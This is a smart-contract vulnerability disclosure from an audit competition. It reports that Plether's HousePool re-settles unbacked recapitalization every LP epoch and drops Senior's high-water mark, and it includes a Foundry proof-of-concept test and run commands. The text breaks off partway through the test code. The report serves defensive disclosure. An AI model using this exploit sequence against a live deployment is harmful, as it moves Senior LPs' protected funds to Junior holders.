# \#99099 [SC-High] Unbacked recapitalization is re-settled every LP epoch and the empty-pool bootstrap drops the old mark, moving Senior's protected recovery to Junior

**Submitted on Nov 11th 2026 at 21:11:29 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99099
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
After a full LP wipe, an owner recapitalization that exceeds the pool's current distributable equity `D` is settled only up to `D`. The unsettled remainder stays pending, and `HousePool` matches it against that same, already-assigned `D` again on every later LP epoch settlement. Each settlement wipes Senior principal and rebuilds it at the same size, but lowers Senior's high-water mark to the shrinking remainder. The empty-pool bootstrap has already thrown away the higher pre-wipe mark. Any Junior holder can trigger these settlements, and routine hourly keeper settlements cause them anyway. In production, when the pool recovers, the value that should restore Senior first is credited to Junior principal, and Junior holders can redeem it. The PoC moves 97,002.12 USDG from Senior to Junior on a 200,000 USDG pool while pool cash never changes. The amount grows with Senior's unrestored entitlement and can reach millions of USDG at the 40M Senior cap.


## Vulnerability Details
The HousePool deliberately keeps Senior's high-water mark `H` after a loss, so that later gains refill Senior before Junior earns anything. `absorbLoss` in `HousePoolWaterfallAccountingLib.sol` (L161-L163) states that "the senior high-water mark is deliberately unchanged so future revenue continues to restore senior impairment". ACCOUNTING_SPEC L337 repeats that "Losses do not reduce the Senior high-water mark". ACCOUNTING_SPEC L339-L340 adds that pending claimant buckets are reserved because "Reserving them in step 2 prevents counting the same inflow twice". SECURITY.md L394 lists the invariant "Senior impairment must be restored before junior extracts surplus". SECURITY.md L155-L163 describes `CfdEngine.recapitalizePool` as the owner's recovery action, and L1209-L1214 says the recapitalization path is "deliberately exempt when restoring protected senior claims". Two defects in how a recapitalization is settled break all of these guarantees.

The first and main defect is in how a partially settled recapitalization is carried forward. At every reconcile, `_reconcile` reads the current pending buckets and caps them by the full `distributable` of the reconcile snapshot:

```solidity
// HousePool.sol L1564-L1566 (_reconcile)
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets = _getPendingClaimantBuckets();
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets =
    _settleablePendingClaimantBuckets(reconcileSnapshot, claimantBuckets);
```

```solidity
// HousePool.sol L1829-L1834
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}
```

`HousePoolReconcilePlanLib.planReconcile` then removes that capped amount from `distributable` before the waterfall prices Senior and Junior:

```solidity
// HousePoolReconcilePlanLib.sol L68-L71
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

On the first reconcile after a recapitalization `X` this is correct, because the distributable `D` is fresh value that nobody owns yet. If `X` is larger than `D`, only `D` is settled and `X − D` stays pending. On the next reconcile, however, `D` is exactly the value that now backs the Senior principal booked one round earlier. The cap has no way to know that. It reserves the same `D` again for the residual, the waterfall receives zero for claims, and Senior and Junior principal are both written off. The pool is back in the empty-principal state, and `_reconcile` applies the recapitalization once more, passing the current bucket as the "intent":

```solidity
// HousePool.sol L1598 (_reconcile)
_applyPendingClaimantBucketsLive(settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation);
```

```solidity
// HousePoolPendingPreviewLib.sol L46-L49 (applyPendingClaimantBucketsPreview)
if (claimantBuckets.recapitalizationAssets > 0) {
    applyClaimantRecapitalizationIntent(
        state, claimantBuckets.recapitalizationAssets, claimantIntentBuckets.recapitalizationAssets
    );
```

The third argument is documented as the "Full recapitalization intent". What actually arrives is the `claimantBuckets` value read at L1564, which is the remaining pending balance and not the original `X`. The empty-principal bootstrap then rebuilds Senior and overwrites the mark with it:

```solidity
// HousePoolPendingPreviewLib.sol L104-L122
/// @notice Routes recapitalization to senior restoration or to unassigned assets.
/// @dev With senior owners and zero claimed principal, all `amount` bootstraps senior principal and sets the
///      high-water mark to `max(recapitalizationTargetAssets, amount)`. ...
/// @param recapitalizationTargetAssets Full recapitalization intent used as the high-water mark on an empty bootstrap.
function applyClaimantRecapitalizationIntent(
    PendingAccountingState memory state,
    uint256 amount,
    uint256 recapitalizationTargetAssets
) internal pure {
    uint256 remaining = amount;
    if (state.seniorSupply > 0) {
        if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
            state.waterfall.seniorPrincipal += remaining;
            state.waterfall.seniorHighWaterMark =
                recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
            remaining = 0;
```

Senior principal comes back at `D`, the same as before, but `H` is now `max(X − D, D)`. Every further reconcile repeats the cycle. The first reconcile leaves `H = X` with `X − D` pending, the second leaves `H = X − D` with `X − 2D` pending, the third leaves `H = X − 2D` with `X − 3D` pending, and so on. The fall stops at the smallest `X − kD` that is still at least `D`. Once the residual is smaller than `D`, principal is no longer fully wiped and the non-zero branch keeps `H`. Throughout this sequence pool cash does not change and Senior principal stays at `D`. The only thing that changes is how many times `settleLpEpoch` has run. The NatSpec promises the full intent as the bootstrap mark, but the code delivers a value that shrinks with every call.

This is a regression introduced by an earlier fix. The cap was added in the pre-audit SC-L1 remediation (Plether-Fi/plether-core#29). Its response says that unbacked recapitalization "stays pending, stays reserved everywhere, and gets applied later once it's backed". The Cecuro MED-12 response makes the same claim: "partial-settlement residuals stay reserved". Neither statement holds. The residual never waits for new backing. It is applied immediately against backing that already belongs to Senior.

The second defect sits in the same bootstrap branch (L118-L122). When Senior and Junior principal are both zero, it writes `H = max(recapitalizationTargetAssets, amount)` without reading the stored `H`. After a full wipe the stored `H` still holds the pre-wipe Senior entitlement, because `absorbLoss` never lowers it. A recapitalization smaller than that entitlement therefore reduces Senior's protection instead of restoring it. The NatSpec explains how the mark is chosen for a fresh bootstrap. It does not say that an existing protected entitlement may be erased, and erasing it contradicts ACCOUNTING_SPEC L337 and the SECURITY.md L394 invariant. The result is also discontinuous. If a single atom of Senior principal survives the loss, the non-zero gap-fill branch runs and the old `H` is kept. If principal is exactly zero, the old `H` is replaced. The first defect makes this worse, because it pushes the pool back into the zero-principal state on every reconcile.

The lowered mark then decides where any recovery goes. `distributeRevenue` measures Senior's deficit against `H` and credits everything above it to Junior:

```solidity
// HousePoolWaterfallAccountingLib.sol L148-L158 (distributeRevenue)
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;
    remaining -= restore;
}
...
nextState.juniorPrincipal += remaining;
```

The path starts with a loss that reconciles Senior and Junior principal to zero while Senior and Junior seed shares remain, so the stored `H` keeps its pre-wipe value. The owner then takes the documented recovery action and calls `CfdEngine.recapitalizePool(X)`, which queues `X` as pending recapitalization. If the distributable `D` at the next reconcile is below `X`, that reconcile settles `D`, bootstraps Senior at `D` and sets `H` to `X`, which already discards the pre-wipe mark. `X − D` stays pending. Every later reconcile with `D` at or below the residual re-reserves `D`, wipes Senior, bootstraps it again and lowers `H` to the smaller residual.

Anyone can drive these reconciles. With no open positions, or with the oracle frozen, `HousePool.settleLpEpoch(0, 0)` is permissionless. Otherwise `OrderRouter.settleLpEpoch` works with a valid Pyth update. Each call needs a matured redeem head or it reverts with `NoLpEpochProgress`. While Junior principal is zero, a holder's full-balance Junior redemption request is refunded, and that refund counts as progress. A Junior holder can therefore drive the decay on purpose, and ordinary hourly keeper settlement produces it even with no attacker. When the pool recovers, `distributeRevenue` finds Senior at or near its lowered mark and credits the recovery to Junior principal, which the Junior holders then redeem.


## Impact Details
The selected impact is "Theft of unclaimed yield" (High), which is on the program's list of in-scope impacts. What is taken is the Senior tranche's protected recovery. Senior has the right to be restored to its high-water mark before Junior receives anything, and this recovery has not yet been paid out. The bug lowers that mark without any change in pool cash, so when the pool recovers, the value that should refill Senior is credited to Junior principal instead. Junior holders can then redeem it through the normal `requestRedeem`, `settleLpEpoch` and `claimRedeem` flow. Senior LPs lose their protected claim, and the value moves to Junior.

The PoC reproduces this with release parameters, production entry points and no token burns. A Senior LP and a Junior LP each deposit 100,000 USDG. A hedged book of 199,000 units per side fills the pool. The winning LONG leg is closed at 0.95, which latches degraded mode. The mark then moves to 1.99, leaving a deficit of 5,988.88 USDG and wiping both tranches, while Senior's stored high-water mark is still 100,001.00. The owner recapitalizes 8,978.88 USDG, which is the minimum needed to clear degraded mode plus 1,000, and calls `clearDegradedMode`. The distributable is 2,990.00 USDG. Three permissionless `router.settleLpEpoch` calls, each driven by the Junior LP's refunded redemption request, move the mark from 8,978.88 to 5,988.88 to 2,998.88. Senior principal stays at 2,990.00 and pool cash stays at exactly 200,000.00 USDG. When the price returns to 1.00 and the SHORT trader closes, Senior is worth 2,998.88 and Junior 197,043.58, and the Junior LP redeems 196,293.86 USDG. The same sequence with the proposed fix simulated restores Senior to 100,001.00 and leaves Junior at 100,041.46. The bug therefore moves 97,002.12 USDG of Senior's protected recovery to Junior, almost half of a 200,000 USDG pool.

In this case the deficit is purely mark-to-market. Pool cash is 200,000.00 USDG at the depressed mark of 1.99, after every settlement, and after the return to 1.00. The "recovery" that Junior receives is therefore not new trading revenue at all. It is Senior's own capital, which never left the pool and is re-labelled as Junior principal.

The same run separates the two defects. The first settlement alone replaces the pre-wipe mark of 100,001.00 with the recapitalization amount of 8,978.88, so even a single reconcile leaves Senior 91,022.12 USDG short of its entitlement. Each further settlement lowers the mark by the distributable of 2,990.00 USDG and moves exactly that amount from Senior to Junior. With one settlement Senior ends at 8,978.88 and Junior at 185,080.68. With three, Senior ends at 2,998.88 and Junior at 197,043.58. By contrast, if a single atom of Senior principal had survived the loss, the non-zero branch of `applyClaimantRecapitalizationIntent` would have kept the old mark.

The amount at risk scales with Senior's unrestored entitlement, meaning the gap between the pre-wipe mark and what the recapitalization actually restores. At the release Senior cap of 40,000,000 USDG, that can reach millions of USDG. The outcome depends only on how many reconciles happen between the recapitalization and the recovery. LP epochs settle hourly, so a few hours are enough. Senior holders cannot stop this, and Junior holders can cause it.

This is profitable value extraction, not griefing. The Junior holders who drive the settlements receive the shifted value pro rata, so the program's griefing downgrade, which applies only when the attacker gains nothing, does not apply. The trigger is `CfdEngine.recapitalizePool`, a legitimate and documented action by a trusted role. The program page lists "a legitimate, documented action by a trusted role that triggers a bug" as in scope. The scenario needs a prior loss that wipes both tranches' principal. The program states that feasibility limitations do not change the impact or severity of a finding, only the amount paid for it.

The residual also causes two lasting side effects while it exists. It is reserved out of the assets available for free withdrawals, and it blocks deposit-epoch activation for both tranches.



## Recommendation

Only settle a pending recapitalization against new backing. Either cap the settleable buckets by the distributable that is still unassigned after the waterfall has repriced Senior, Junior and unassigned assets, or retire the part that cannot be backed instead of letting it re-reserve value that already belongs to Senior. In addition, the zero-principal branch of `applyClaimantRecapitalizationIntent` should set the high-water mark to `max(storedH, recapitalizationTargetAssets, amount)`, so that a recapitalization can never lower Senior's protected entitlement. This change alone already stops the value transfer from both defects, as the simulated-fix test shows. Finally, an invariant test should assert that a reconcile with no new cash and an unchanged mark leaves Senior principal, Junior principal and the high-water mark unchanged.


## References
- Pending buckets capped by the full distributable: [HousePool.sol#L1829-L1834](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L1829-L1834)
- Capped amount reserved out of distributable before the waterfall: [HousePoolReconcilePlanLib.sol#L68-L71](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol?plain=1#L68-L71)
- Current (shrinking) pending bucket passed as the recapitalization intent: [HousePool.sol#L1564](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L1564), [HousePool.sol#L1598](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L1598)
- Empty-principal bootstrap overwrites the high-water mark: [HousePoolPendingPreviewLib.sol#L104-L122](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol?plain=1#L104-L122)



## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. Every trade goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by an arbitrary keeper address. Every LP deposit and redemption uses the public request → `router.settleLpEpoch` → claim flow. Refunded redemption shares are reclaimed with the public `claimRedeemRefund`, and the mark is moved with the permissionless `router.updateMarkPrice`. The only privileged calls are the owner's documented recovery actions, `CfdEngine.recapitalizePool` and `CfdEngine.clearDegradedMode`. No protocol contract is impersonated, and no pool balance is burned. Tranche values are read from the public `seniorVault.totalAssets()` and `juniorVault.totalAssets()` views.

The test applies the release parameters from `DEPLOYMENT.md`: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4, 4 bps execution fee, 10/20 bps maintenance/initial margins, 2,500 bps adverse confidence multiplier, Senior cap 40M/80% and 1 USDG seeds. Three branches start from the same EVM snapshot taken right after the recapitalization: one settlement before the recovery, three settlements, and three settlements with the proposed fix simulated.

### Step-by-step (`test_RepeatedSettles_MoveSeniorRecoveryToJunior`)

1. **Setup.** A Junior LP and a Senior LP each deposit 100,000 USDG through the public async deposit flow.
2. **Fill.** A LONG trader and a SHORT trader alternately open 10,000-unit and then 1,000-unit chunks at 1.00 until the pool is full, ending with 199,000 units per side.
3. **Degrade.** The LONG trader closes its whole position at 0.95. This is the winning leg, and the close latches `degradedMode`.
4. **Wipe.** The mark moves to 1.99. The reconcile snapshot shows a deficit of 5,988.88 USDG, so both tranches are wiped at this mark. Senior's stored high-water mark is still 100,001.00.
5. **Recapitalize.** The owner calls `recapitalizePool(8,978.88)`, the minimum needed to clear degraded mode plus 1,000, and then `clearDegradedMode()`. Pool cash is 200,000.00 and the distributable is `D` = 2,990.00, which is below `X`.
6. **Settle.** The Junior LP requests a redemption of its full balance, and at maturity a keeper calls `router.settleLpEpoch`. Junior principal is zero, so the request is refunded, which counts as epoch progress. The LP reclaims its shares with `claimRedeemRefund`, waits out the 1-hour cooldown and repeats. After settlements 1, 2 and 3, the Senior high-water mark is 8,978.88, 5,988.88 and 2,998.88 and the pending recapitalization is 5,988.88, 2,998.88 and 8.88. Senior principal stays at 2,990.00 and pool cash at 200,000.00 throughout.
7. **Recover.** The mark returns to 1.00 and pool cash is still 200,000.00. The SHORT trader closes through the router. Senior is worth 2,998.88 and Junior 197,043.58.
8. **Redeem.** The Junior LP requests its full redemption, the epoch settles, and it claims **196,293.86 USDG**.
9. **Result vs fix.** With the fix simulated, Senior is restored to 100,001.00. The bug moves **97,002.12 USDG** of Senior's protected recovery to Junior.

### Branches compared in the test

| Branch | Settlements before recovery | Senior high-water mark before recovery | Senior value after recovery | Junior value after recovery | USDG the Junior LP redeems |
| --- | --- | --- | --- | --- | --- |
| One settlement | 1 | 8,978.88 | 8,978.88 | 185,080.68 | 182,835.96 |
| Three settlements (bug) | 3 | 2,998.88 | 2,998.88 | 197,043.58 | 196,293.86 |
| Three settlements, fix simulated | 3 | 100,001.00 | 100,001.00 | 100,041.46 | 75,041.21 |

The fix-simulated branch is a counterfactual only. After each settlement it writes the pre-wipe value back into the `seniorHighWaterMark` storage slot, and the test checks first that slot 7 holds `seniorHighWaterMark()`. This emulates the recommended `max(storedH, target, amount)` bootstrap, and no step of the attack uses it. In that branch the Junior LP's redemption is limited by the Junior-withdrawal covenant, because Senior is restored and Junior must keep 25% of the Senior exposure. In all three branches pool cash is 200,000.00 at 1.99 and at 1.00.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/RecapResidualResettle.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/RecapResidualResettle.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 1 passed; 0 failed; 0 skipped`, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {HousePoolAccountingLib} from "@plether/perps/libraries/HousePoolAccountingLib.sol";
import {console2} from "forge-std/console2.sol";

/// @title Unbacked recapitalization is re-settled against Senior's own backing on every LP epoch
/// @notice After a full LP wipe, an owner recapitalization `X` larger than the distributable `D` settles only `D`.
///         Every later LP epoch settlement caps the residual against the same, already-assigned `D`, wipes Senior,
///         re-bootstraps it at `D` and lowers the Senior high-water mark to the shrinking residual. The first bootstrap
///         also discards the pre-wipe mark. When the price recovers, the value that should restore Senior is credited
///         to Junior principal and redeemed by the Junior LP.
/// @dev Every trade enters through the production V3 `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by
///      an untrusted keeper. Every LP deposit, redemption and epoch settlement uses the public request ->
///      `router.settleLpEpoch` -> claim flow. The only privileged calls are the owner's documented recovery actions
///      `CfdEngine.recapitalizePool` and `CfdEngine.clearDegradedMode`. Release parameters from
///      `packages/perps/DEPLOYMENT.md`. No protocol contract is impersonated and no pool balance is burned.
contract RecapResidualResettleTest is BasePerpTest {

    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant JUNIOR_LP = address(0x1A1); // Junior LP who drives the settlements
    address internal constant LONG_TRADER = address(0x1111);
    address internal constant SHORT_TRADER = address(0x2222);
    address internal constant KEEPER = address(0xBEEF); // untrusted keeper / third party

    uint256 internal constant LP_DEPOSIT = 100_000e6;
    uint256 internal constant TRADER_CASH = 1_000_000e6;
    uint256 internal constant SPIKE_PRICE = 1.99e8;

    struct Outcome {
        uint256 hwmAfterSettles; // Senior high-water mark after the settlements, before the price recovers
        uint256 seniorPrincipalAfterSettles;
        uint256 settles; // number of LP epoch settlements between recapitalization and recovery
        uint256 poolCashAtSpike; // pool.totalAssets() at the depressed mark
        uint256 poolCashAtRecovery; // pool.totalAssets() after the price returns to 1.00
        uint256 seniorValue; // seniorVault.totalAssets() after recovery (public view)
        uint256 juniorValue; // juniorVault.totalAssets() after recovery (public view)
        uint256 juniorRedeemedUsdg; // USDG the Junior LP actually receives for its full redemption after recovery
    }

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        // The timelock warps above end inside the weekend market closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");

        // Junior first: Senior capacity is bounded by maxSeniorShareBps (80%) of the tranche total.
        _publicDeposit(juniorVault, JUNIOR_LP, LP_DEPOSIT);
        _publicDeposit(seniorVault, SENIOR_LP, LP_DEPOSIT);
        vm.warp(vm.getBlockTimestamp() + 1 hours); // deposit cooldown
    }

    // ------------------------------------------------------------------------------------------------------------
    // Production entry points
    // ------------------------------------------------------------------------------------------------------------

    function _publicDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId));
        _settle(1e8);
        assertEq(vault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        vault.claimDeposit(requestId, amount, lp, lp);
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        // Widest admissible slippage bound (OrderValidationLib.checkSlippage); V3 requires a nonzero target.
        bool acceptsLowerPrice = isClose ? side == CfdTypes.Side.LONG : side == CfdTypes.Side.SHORT;
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: acceptsLowerPrice ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        orderId = IPerpsTraderActions(address(router)).commitOrder(request);
    }

    function _keeperExecute(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.executeOrder(router.nextExecuteId(), data);
    }

    /// @dev External so that a commit-time rejection can be caught while filling the book.
    function ext_tradeViaRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) external {
        require(msg.sender == address(this));
        _commit(account, side, size, margin, isClose);
        _keeperExecute(price);
    }

    function _settle(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER); // permissionless
        router.settleLpEpoch(data);
    }

    function _updateMark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER); // permissionless
        router.updateMarkPrice(data);
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Scenario
    // ------------------------------------------------------------------------------------------------------------

    /// @dev A hedged book fills the pool, the winning LONG leg is closed at 0.95 (latching degraded mode) and the mark
    ///      moves to 1.99, where the remaining SHORT book leaves the pool in deficit. All trades go through the router.
    function _fillAndSpike() internal returns (uint256 deficit) {
        _updateMark(1e8);
        _fundTrader(LONG_TRADER, TRADER_CASH);
        _fundTrader(SHORT_TRADER, TRADER_CASH);
        uint256 chunk = 10_000e18;
        for (uint256 i; i < 60; i++) {
            uint256 longBefore = _positionSize(LONG_TRADER);
            uint256 shortBefore = _positionSize(SHORT_TRADER);
            try this.ext_tradeViaRouter(LONG_TRADER, CfdTypes.Side.LONG, chunk, chunk / 5e12, false, 1e8) {} catch {}
            try this.ext_tradeViaRouter(SHORT_TRADER, CfdTypes.Side.SHORT, chunk, chunk / 5e12, false, 1e8) {} catch {}
            if (_positionSize(LONG_TRADER) == longBefore && _positionSize(SHORT_TRADER) == shortBefore) {
                if (chunk == 1000e18) {
                    break;
                }
                chunk = 1000e18;
            }
        }
        console2.log(
            "LONG / SHORT size (1e18 units)", _positionSize(LONG_TRADER) / 1e18, _positionSize(SHORT_TRADER) / 1e18
        );
        assertGt(_positionSize(LONG_TRADER), 0, "book filled");

        this.ext_tradeViaRouter(LONG_TRADER, CfdTypes.Side.LONG, _positionSize(LONG_TRADER), 0, true, 0.95e8);
        assertEq(_positionSize(LONG_TRADER), 0, "winning LONG leg closed");
        assertTrue(engine.degradedMode(), "winning-leg close latches degraded mode");

        _updateMark(SPIKE_PRICE);
        deficit =
        HousePoolAccountingLib.buildReconcileSnapshot(
            engineProtocolLens.getHousePoolInputSnapshot(pool.markStalenessLimit())
        )
        .deficit;
        _usd("deficit at the 1.99 mark", deficit);
        assertGt(deficit, 0, "both tranches are wiped at this mark");
    }

    /// @dev The owner's documented recovery: recapitalize the minimum that clears degraded mode plus 1,000 USDG.
    function _recapitalizeAndClear() internal returns (uint256 x) {
        x = _maxLiability() - pool.totalAssets() + 1000e6;
        settlementToken.mint(address(this), x);
        settlementToken.approve(address(engine), x);
        engine.recapitalizePool(x); // owner
        engine.clearDegradedMode(); // owner
        _usd("recapitalization X", x);
    }

    function _distributable() internal view returns (uint256) {
        return HousePoolAccountingLib.buildReconcileSnapshot(
            engineProtocolLens.getHousePoolInputSnapshot(pool.markStalenessLimit())
        )
        .distributable;
    }

    /// @dev Waits out the share cooldown (restarted by a refund claim) and queues the Junior LP's full balance.
    function _requestFullJuniorRedeem() internal returns (uint256 id) {
        uint256 unlock = juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock);
        }
        uint256 shares = juniorVault.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        id = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
    }

    /// @dev One LP epoch settlement driven by the Junior LP. While Junior principal is zero its full-balance redemption
    ///      is refunded, which counts as epoch progress, so the permissionless settlement goes through. The LP then
    ///      claims its refunded shares back.
    function _juniorDrivenSettle() internal {
        uint256 id = _requestFullJuniorRedeem();
        vm.warp(juniorVault.depositEpochStart(id));
        _settle(SPIKE_PRICE);
        assertTrue(juniorVault.redeemRefundPending(id, JUNIOR_LP), "zero-value Junior redemption is refunded");
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeemRefund(id, JUNIOR_LP, JUNIOR_LP);
    }

    /// @dev `maxSettles` settlements at the depressed mark, then the price returns to 1.00 and the Junior LP redeems.
    ///      `simulateFix` restores the stored high-water mark after each settlement (counterfactual only).
    function _run(
        uint256 maxSettles,
        bool simulateFix,
        uint256 hwmBefore
    ) internal returns (Outcome memory o) {
        o.poolCashAtSpike = pool.totalAssets();
        assertEq(uint256(vm.load(address(pool), bytes32(uint256(7)))), pool.seniorHighWaterMark(), "slot 7 = H");
        for (uint256 i; i < maxSettles && pool.pendingRecapitalizationAssets() > 0; i++) {
            _juniorDrivenSettle();
            if (simulateFix && pool.seniorHighWaterMark() < hwmBefore) {
                // Counterfactual only: emulate H = max(storedH, target, amount) on the bootstrap.
                vm.store(address(pool), bytes32(uint256(7)), bytes32(hwmBefore));
            }
            o.settles++;
            console2.log("  settlement", o.settles);
            _usd("    Senior high-water mark", pool.seniorHighWaterMark());
            _usd("    Senior principal", pool.seniorPrincipal());
            _usd("    pending recapitalization", pool.pendingRecapitalizationAssets());
            _usd("    pool cash", pool.totalAssets());
        }
        o.hwmAfterSettles = pool.seniorHighWaterMark();
        o.seniorPrincipalAfterSettles = pool.seniorPrincipal();

        _updateMark(1e8); // the price returns to its starting level
        o.poolCashAtRecovery = pool.totalAssets();

        // The SHORT trader closes at 1.00, releasing the cash reserved for its open position.
        this.ext_tradeViaRouter(SHORT_TRADER, CfdTypes.Side.SHORT, _positionSize(SHORT_TRADER), 0, true, 1e8);
        assertEq(_positionSize(SHORT_TRADER), 0, "SHORT closed");
        o.seniorValue = seniorVault.totalAssets();
        o.juniorValue = juniorVault.totalAssets();

        // The Junior LP redeems through the public flow.
        uint256 id = _requestFullJuniorRedeem();
        vm.warp(juniorVault.depositEpochStart(id));
        _settle(1e8);
        uint256 claimable = juniorVault.claimableRedeemRequest(id, JUNIOR_LP);
        uint256 before = settlementToken.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeem(id, claimable, JUNIOR_LP, JUNIOR_LP);
        o.juniorRedeemedUsdg = settlementToken.balanceOf(JUNIOR_LP) - before;
    }

    function _logOutcome(
        string memory tag,
        Outcome memory o
    ) internal pure {
        console2.log(tag);
